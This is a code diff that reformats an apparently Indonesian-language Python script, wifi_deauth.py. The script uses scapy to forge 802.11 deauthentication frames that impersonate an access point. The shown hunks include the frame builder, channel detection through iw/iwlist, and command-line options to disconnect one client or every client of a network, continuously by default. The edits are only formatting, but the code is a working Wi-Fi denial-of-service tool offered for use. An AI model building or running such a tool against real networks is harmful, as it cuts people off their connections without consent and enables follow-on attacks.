@@ -43,9 +43,11 @@ def format_mac(mac: str) -> str:
 
 
 def build_deauth_frame(ap_mac: str, target_mac: str, reason: int = 7):
-    return RadioTap() / Dot11(
-        type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac
-    ) / Dot11Deauth(reason=reason)
+    return (
+        RadioTap()
+        / Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
+        / Dot11Deauth(reason=reason)
+    )
 
 
 def run_attack(args):
@@ -90,7 +92,9 @@ def run_attack(args):
     except KeyboardInterrupt:
         pass
     except PermissionError:
-        sys.exit("[!] Izin ditolak. Pastikan interface dalam monitor mode dan jalankan sebagai root.")
+        sys.exit(
+            "[!] Izin ditolak. Pastikan interface dalam monitor mode dan jalankan sebagai root."
+        )
     except OSError as e:
         sys.exit(f"[!] Error interface: {e}")
 
@@ -101,21 +105,28 @@ def _set_channel(iface: str, channel: int):
     if os.name == "posix":
         try:
             import subprocess
-            subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
-                           capture_output=True, check=True)
+
+            subprocess.run(
+                ["iw", "dev", iface, "set", "channel", str(channel)],
+                capture_output=True,
+                check=True,
+            )
         except Exception:
             print(f"[!] Gagal mengatur channel {channel} pada {iface}")
 
 
 def scan_channels(iface: str, ap_mac: str):
     import subprocess
+
     ap_mac = format_mac(ap_mac).lower()
     print(f"[*] Mencari channel untuk AP {ap_mac}...")
     try:
         if os.name == "posix":
             result = subprocess.run(
                 ["iwlist", iface.replace("mon", "").rstrip("mon"), "scan"],
-                capture_output=True, text=True, timeout=15
+                capture_output=True,
+                text=True,
+                timeout=15,
             )
             for line in result.stdout.splitlines():
                 line_lower = line.lower()
@@ -131,6 +142,7 @@ def scan_channels(iface: str, ap_mac: str):
 
 def _extract_channel(line: str) -> int | None:
     import re
+
     m = re.search(r"channel\s*:?\s*(\d+)", line)
     if m:
         return int(m.group(1))
@@ -155,14 +167,23 @@ Contoh:
   python wifi_deauth.py --ap 00:11:22:33:44:55 --broadcast --iface wlan0mon --test
         """,
     )
-    parser.add_argument("--ap", required=True, help="MAC address Access Point (contoh: AA:BB:CC:DD:EE:FF)")
+    parser.add_argument(
+        "--ap", required=True, help="MAC address Access Point (contoh: AA:BB:CC:DD:EE:FF)"
+    )
     parser.add_argument("--target", help="MAC address target client")
     parser.add_argument("--iface", required=True, help="Interface monitor mode (contoh: wlan0mon)")
-    parser.add_argument("--count", type=int, default=0, help="Jumlah paket deauth (0 = terus-menerus)")
+    parser.add_argument(
+        "--count", type=int, default=0, help="Jumlah paket deauth (0 = terus-menerus)"
+    )
     parser.add_argument("--broadcast", action="store_true", help="Deauth semua client dari AP")
     parser.add_argument("--channel", type=int, default=0, help="Channel WiFi (0 = auto-detect)")
     parser.add_argument("--reason", type=int, default=7, help="Kode alasan deauth (default: 7)")
-    parser.add_argument("--interval", type=float, default=0.1, help="Interval antar paket dalam detik (default: 0.1)")
+    parser.add_argument(
+        "--interval",
+        type=float,
+        default=0.1,
+        help="Interval antar paket dalam detik (default: 0.1)",
+    )
     parser.add_argument("--test", action="store_true", help="Mode test: kirim 1 paket saja")
     args = parser.parse_args()
 
